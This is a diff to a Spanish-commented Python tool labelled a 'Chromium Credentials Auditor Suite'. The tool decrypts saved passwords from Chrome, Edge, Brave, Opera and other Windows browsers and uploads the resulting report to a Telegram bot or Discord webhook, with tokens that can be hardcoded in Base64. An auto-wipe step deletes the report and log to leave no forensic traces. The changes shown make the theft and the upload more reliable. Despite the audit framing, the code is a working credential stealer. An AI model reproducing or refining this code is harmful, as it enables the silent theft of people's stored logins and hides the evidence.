@@ -17,10 +17,16 @@ from datetime import datetime
 # =========================================================================
 # Tip: Usa un convertidor Online de 'Plain Text to Base64' para estos campos.
 # Ej (Base64): "MTIzNDU2Nzg5MDpBQkMtREVGM..."
-HARDCODED_TG_TOKEN = "" # Token de Telegram (B64 o Plano)
-HARDCODED_TG_ID = ""    # Chat ID (B64 o Plano)
-HARDCODED_DS_WEBHOOK = "" # Discord Webhook (B64 o Plano)
+HARDCODED_TG_TOKEN  = ""  # Token de Telegram (B64 o Plano)
+HARDCODED_TG_ID     = ""  # Chat ID           (B64 o Plano)
+HARDCODED_DS_WEBHOOK = "" # Discord Webhook   (B64 o Plano)
 # =========================================================================
+
+# FIX #6: Advertencia temprana si se ejecuta fuera de Windows
+if sys.platform != "win32":
+    print("[WARN] Esta herramienta está diseñada exclusivamente para Windows.")
+    print("[WARN] DPAPI no está disponible en este sistema. La extracción fallará.")
+    sys.exit(1)
 
 def safe_b64_decode(val):
     """Decodifica Base64 solo si tiene contenido, de lo contrario devuelve el original."""
@@ -39,14 +45,14 @@ except ImportError:
 
 from Cryptodome.Cipher import AES
 
-# Configuración de Logging profesional
+# Configuración de Logging (nivel se ajusta dinámicamente según -v)
+LOG_FILE = "pentest_audit.log"
+_file_handler   = logging.FileHandler(LOG_FILE, encoding='utf-8')
+_stream_handler = logging.StreamHandler(sys.stdout)
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler("pentest_audit.log", encoding='utf-8'),
-        logging.StreamHandler(sys.stdout)
-    ]
+    handlers=[_file_handler, _stream_handler]
 )
 logger = logging.getLogger(__name__)
 
@@ -96,11 +102,14 @@ HTML_TEMPLATE = """
 </html>
 """
 
+# Timeout global para todas las peticiones de red (segundos)
+REQUEST_TIMEOUT = 10
+
 class Exfiltrator:
     def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None):
-        self.telegram_token = telegram_token
+        self.telegram_token   = telegram_token
         self.telegram_chat_id = telegram_chat_id
-        self.discord_webhook = discord_webhook
+        self.discord_webhook  = discord_webhook
 
     def send_to_telegram(self, file_path):
         if not self.telegram_token or not self.telegram_chat_id:
@@ -108,9 +117,21 @@ class Exfiltrator:
         url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
         try:
             with open(file_path, 'rb') as f:
-                requests.post(url, data={'chat_id': self.telegram_chat_id}, files={'document': f})
-            logger.info("Exfiltración vía Telegram exitosa.")
-            return True
+                # FIX #2: Timeout para evitar cuelgues indefinidos
+                response = requests.post(
+                    url,
+                    data={'chat_id': self.telegram_chat_id},
+                    files={'document': f},
+                    timeout=REQUEST_TIMEOUT
+                )
+            # FIX #3: Verificar código HTTP de respuesta
+            if response.status_code == 200:
+                logger.info("Exfiltración vía Telegram exitosa.")
+                return True
+            else:
+                logger.error(f"Telegram rechazó la petición: HTTP {response.status_code} - {response.text[:200]}")
+        except requests.exceptions.Timeout:
+            logger.error("Timeout: Telegram no respondió en el tiempo límite.")
         except Exception as e:
             logger.error(f"Falla Telegram: {e}")
         return False
@@ -120,9 +141,20 @@ class Exfiltrator:
             return False
         try:
             with open(file_path, 'rb') as f:
-                requests.post(self.discord_webhook, files={'file': f})
-            logger.info("Exfiltración vía Discord exitosa.")
-            return True
+                # FIX #2: Timeout para evitar cuelgues indefinidos
+                response = requests.post(
+                    self.discord_webhook,
+                    files={'file': f},
+                    timeout=REQUEST_TIMEOUT
+                )
+            # FIX #3: Verificar código HTTP de respuesta
+            if response.status_code in (200, 204):
+                logger.info("Exfiltración vía Discord exitosa.")
+                return True
+            else:
+                logger.error(f"Discord rechazó la petición: HTTP {response.status_code} - {response.text[:200]}")
+        except requests.exceptions.Timeout:
+            logger.error("Timeout: Discord no respondió en el tiempo límite.")
         except Exception as e:
             logger.error(f"Falla Discord: {e}")
         return False
@@ -130,15 +162,15 @@ class Exfiltrator:
 
 class ChromiumDecryptor:
     def __init__(self):
-        self.local = Path(os.environ.get('LOCALAPPDATA', ''))
+        self.local  = Path(os.environ.get('LOCALAPPDATA', ''))
         self.roaming = Path(os.environ.get('APPDATA', ''))
         self.browsers = {
-            "Chrome":    self.local  / "Google/Chrome/User Data",
-            "Edge":      self.local  / "Microsoft/Edge/User Data",
-            "Brave":     self.local  / "BraveSoftware/Brave-Browser/User Data",
-            "Vivaldi":   self.local  / "Vivaldi/User Data",
-            "Opera":     self.roaming / "Opera Software/Opera Stable",
-            "Opera GX":  self.roaming / "Opera Software/Opera GX Stable",
+            "Chrome":   self.local   / "Google/Chrome/User Data",
+            "Edge":     self.local   / "Microsoft/Edge/User Data",
+            "Brave":    self.local   / "BraveSoftware/Brave-Browser/User Data",
+            "Vivaldi":  self.local   / "Vivaldi/User Data",
+            "Opera":    self.roaming / "Opera Software/Opera Stable",
+            "Opera GX": self.roaming / "Opera Software/Opera GX Stable",
         }
 
     def get_key(self, path):
@@ -154,6 +186,9 @@ class ChromiumDecryptor:
             return None
 
     def decrypt(self, blob, key):
+        # FIX #4: Validar longitud mínima del blob antes de intentar descifrar
+        if not isinstance(blob, (bytes, bytearray)) or len(blob) < 15:
+            return "[Blob inválido o corrupto]"
         try:
             cipher = AES.new(key, AES.MODE_GCM, blob[3:15])
             return cipher.decrypt(blob[15:-16]).decode()
@@ -178,7 +213,8 @@ class ChromiumDecryptor:
                 db = p / "Login Data"
                 if not db.exists():
                     continue
-                tmp = Path(f"tmp_audit_{os.getpid()}.db")  # FIX: único por PID, evita colisiones en ejecución paralela
+                # FIX: Nombre de tmp único por PID → evita colisiones si se ejecuta en paralelo
+                tmp = Path(f"tmp_audit_{os.getpid()}.db")
                 conn = None
                 try:
                     shutil.copy2(db, tmp)
@@ -193,21 +229,21 @@ class ChromiumDecryptor:
                     logger.warning(f"Error leyendo {name}/{p.name}: {e}")
                 finally:
                     if conn:
-                        conn.close()  # BUG FIX: Cerrar conexión antes de borrar el archivo
+                        conn.close()
                     if tmp.exists():
                         tmp.unlink()
 
-        # BUG FIX: No generar archivo si no hay datos
+        # No generar archivo si no hay datos
         if not data:
             logger.info("No se encontraron credenciales.")
             return 0, None
 
-        # FIX: Si el archivo ya existe, añade timestamp para no sobreescribir auditorías previas
+        # Si el archivo ya existe, añade timestamp para preservar auditorías anteriores
         base_out = f"{out}.{fmt}"
         if Path(base_out).exists():
             stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             final_out = f"{out}_{stamp}.{fmt}"
-            logger.info(f"Archivo existente detectado. Usando nombre alternativo: {final_out}")
+            logger.info(f"Archivo existente detectado. Guardando como: {final_out}")
         else:
             final_out = base_out
 
@@ -219,13 +255,13 @@ class ChromiumDecryptor:
         elif fmt == "html":
             rows_html = ""
             for r in data:
-                # FIX: Escapar todos los campos para evitar inyección HTML
+                # FIX: Escapar todos los campos para prevenir inyección HTML
                 badge_class = r[0].lower().replace(' ', '-')
-                browser  = html.escape(r[0])
-                profile  = html.escape(r[1])
-                url      = html.escape(r[2])
-                user     = html.escape(r[3])
-                password = html.escape(r[4])
+                browser     = html.escape(r[0])
+                profile     = html.escape(r[1])
+                url         = html.escape(r[2])
+                user        = html.escape(r[3])
+                password    = html.escape(r[4])
                 rows_html += (
                     f"<tr><td><span class='browser-badge {badge_class}'>{browser}</span></td>"
                     f"<td>{profile}</td><td>{url}</td><td>{user}</td><td>{password}</td></tr>"
@@ -241,17 +277,22 @@ class ChromiumDecryptor:
         return len(data), final_out
 
 
+def _close_log_handler():
+    """Cierra y desconecta el FileHandler del ROOT logger antes de borrar el archivo.
+    basicConfig() registra los handlers en logging.root, no en el logger hijo."""
+    for handler in logging.root.handlers[:]:
+        if isinstance(handler, logging.FileHandler):
+            handler.close()
+            logging.root.removeHandler(handler)
+
+
 def main():
     parser = argparse.ArgumentParser(description="Chromium Credentials Auditor Suite")
-    parser.add_argument("-f", "--format", choices=["csv", "html"], default="html",
+    parser.add_argument("-f", "--format",  choices=["csv", "html"], default="html",
                         help="Formato de salida del reporte.")
-    parser.add_argument("-o", "--output", default="audit_report",
+    parser.add_argument("-o", "--output",  default="audit_report",
                         help="Nombre base del archivo de salida.")
-
-    # BUG FIX: El default del parser recibe el valor crudo (sin decodificar).
-    # La decodificación Base64 se aplica UNA SOLA VEZ en main(), cubriendo
-    # tanto el hardcoding como los valores pasados por -t, -c, -d.
-    parser.add_argument("-t", "--telegram-token", default=HARDCODED_TG_TOKEN,
+    parser.add_argument("-t", "--telegram-token",  default=HARDCODED_TG_TOKEN,
                         help="Token del bot de Telegram (Plano o Base64).")
     parser.add_argument("-c", "--telegram-chatid", default=HARDCODED_TG_ID,
                         help="Chat ID personal de Telegram (Plano o Base64).")
@@ -259,10 +300,18 @@ def main():
                         help="URL del Webhook de Discord (Plano o Base64).")
     parser.add_argument("--no-wipe", action="store_true",
                         help="Desactiva el auto-borrado del reporte tras exfiltración.")
+    # FIX #5: Implementar -v/--verbose que sí funcionaba en el README pero no en el código
+    parser.add_argument("-v", "--verbose", action="store_true",
+                        help="Muestra logs detallados de depuración en consola.")
 
     args = parser.parse_args()
 
-    # Decodificación Base64 universal (una sola pasada, cubre hardcoding y CLI)
+    # FIX #5: Ajustar nivel de log dinámicamente según -v
+    if args.verbose:
+        logging.getLogger().setLevel(logging.DEBUG)
+        logger.debug("Modo verbose activado.")
+
+    # Decodificación Base64 universal — una sola pasada cubre hardcoding y CLI
     token   = safe_b64_decode(args.telegram_token)
     chatid  = safe_b64_decode(args.telegram_chatid)
     discord = safe_b64_decode(args.discord)
@@ -279,13 +328,15 @@ def main():
         if discord:
             exf.send_to_discord(final_file)
 
-        # Auto-Wipe: elimina reporte Y log para dejar cero artefactos forenses
+        # Auto-Wipe: elimina reporte Y log para dejar cero artefactos forenses en disco
         if not args.no_wipe and (token or discord):
             Path(final_file).unlink()
-            log_file = Path("pentest_audit.log")
+            # FIX #1: Cerrar FileHandler ANTES de borrar el .log para evitar que se recree
+            _close_log_handler()
+            log_file = Path(LOG_FILE)
             if log_file.exists():
                 log_file.unlink()
-            logger.info("Auto-Wipe completado: reporte y log eliminados.")  # Este msg no quedará en disco
+            print("[+] Auto-Wipe completado: reporte y log eliminados.")
 
 
 if __name__ == "__main__":
